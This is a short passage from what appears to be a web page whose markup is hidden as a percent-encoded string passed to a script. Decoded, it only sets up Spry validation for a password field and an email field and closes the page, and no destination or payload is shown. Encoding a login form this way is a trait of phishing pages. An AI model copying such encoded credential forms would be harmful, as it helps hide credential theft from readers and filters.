7D%20%20%20%20%0A%20%20%20%20%7D%29%3B%20%3B%0A%0A%76%61%72%20%73%70%72%79%70%61%73%73%77%6F%72%64%31%20%3D%20%6E%65%77%20%53%70%72%79%2E%57%69%64%67%65%74%2E%56%61%6C%69%64%61%74%69%6F%6E%50%61%73%73%77%6F%72%64%28%22%73%70%72%79%70%61%73%73%77%6F%72%64%31%22%29%3B%0A%76%61%72%20%73%70%72%79%74%65%78%74%66%69%65%6C%64%31%20%3D%20%6E%65%77%20%53%70%72%79%2E%57%69%64%67%65%74%2E%56%61%6C%69%64%61%74%69%6F%6E%54%65%78%74%46%69%65%6C%64%28%22%73%70%72%79%74%65%78%74%66%69%65%6C%64%31%22%2C%20%22%65%6D%61%69%6C%22%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%3C%2F%62%6F%64%79%3E%3C%2F%68%74%6D%6C%3E'));
</script>